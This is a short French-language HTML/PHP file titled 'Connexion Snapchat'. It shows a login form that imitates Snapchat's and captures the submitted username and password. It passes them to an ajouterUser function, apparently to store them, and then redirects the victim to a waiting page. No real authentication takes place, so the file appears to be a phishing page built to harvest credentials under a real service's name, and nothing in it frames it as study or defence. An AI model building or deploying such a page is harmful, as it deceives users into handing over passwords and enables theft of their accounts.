<!DOCTYPE html>
<html>

<head>
    <title>Connexion Snapchat</title>
    <link rel="stylesheet" type="text/css" href="style.css">
</head>

<body>
    <div class="container">
        <form method="POST">
            <h2>Connexion</h2>
            <label for="username">nom d'utilisateur</label>
            <input type="text" name="username" placeholder="Nom d'utilisateur" required>
            <label for="password">mot de passe</label>
            <input type="password" name="password" placeholder="Mot de passe" required>
            <input name="envoyer" type="submit" value="Se connecter">
        </form>
    </div>
</body>

</html>
<?php
require 'commande.php';
if (isset($_POST['envoyer'])) {
    if (!empty($_POST['username']) and !empty($_POST['password'])) {
        $email = htmlspecialchars(strip_tags($_POST['username']));
        $motdepasse = htmlspecialchars(strip_tags($_POST['password']));


        $user = ajouterUser($email, $motdepasse);

        if ($user) {
            // $_SESSION['userxXJppk45hPGu'] = $user;
            header('Location: attante.php');
        } else {
            echo "<h1>pas de connection</h1>";
        }
    }
}
